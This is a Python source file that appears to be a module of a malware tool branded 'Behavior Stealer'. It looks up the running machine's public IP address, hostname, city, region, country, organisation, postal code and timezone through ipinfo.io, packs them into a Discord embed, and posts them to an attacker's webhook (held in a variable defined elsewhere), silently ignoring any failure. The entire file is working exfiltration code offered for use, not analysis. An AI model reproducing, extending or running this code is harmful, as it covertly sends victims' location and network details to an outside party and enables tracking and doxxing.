import requests

AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"

def get_ip_info():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=10)
        if r.status_code == 200:
            data = r.json()
            fields = []

            if 'ip' in data:
                fields.append({"name": "\U0001F5A7 IP Address", "value": data['ip'], "inline": True})
            if 'hostname' in data:
                fields.append({"name": "\U0001F3E0 Hostname", "value": data['hostname'], "inline": True})
            if 'city' in data or 'region' in data or 'country' in data:
                location = ", ".join(filter(None, [data.get('city'), data.get('region'), data.get('country')]))
                fields.append({"name": "\U0001F4CD Location", "value": location, "inline": False})
            if 'org' in data:
                fields.append({"name": "\U0001F3E2 Organization", "value": data['org'], "inline": False})
            if 'postal' in data:
                fields.append({"name": "\U0001F4EE Postal Code", "value": data['postal'], "inline": True})
            if 'timezone' in data:
                fields.append({"name": "\u23F0 Timezone", "value": data['timezone'], "inline": True})

            if not fields:
                fields.append({"name": "Info", "value": "No data found", "inline": False})

            return fields
        else:
            return [{"name": "Error", "value": "Failed to get IP info", "inline": False}]
    except Exception as e:
        return [{"name": "Exception", "value": str(e), "inline": False}]

def send_embed(fields):
    if not Behavior:
        return

    embed = {
        "title": "\U0001F310 IP Information",
        "color": 0x00FFFF,
        "fields": fields,
        "footer": {"text": "Behavior Stealer \U0001F47E"}
    }

    payload = {
        "username": "Behavior Stealer",
        "avatar_url": AVATAR_URL,
        "embeds": [embed]
    }

    try:
        requests.post(Behavior, json=payload)
    except:
        pass

def run():
    fields = get_ip_info()
    send_embed(fields)

if __name__ == "__main__":
    run()
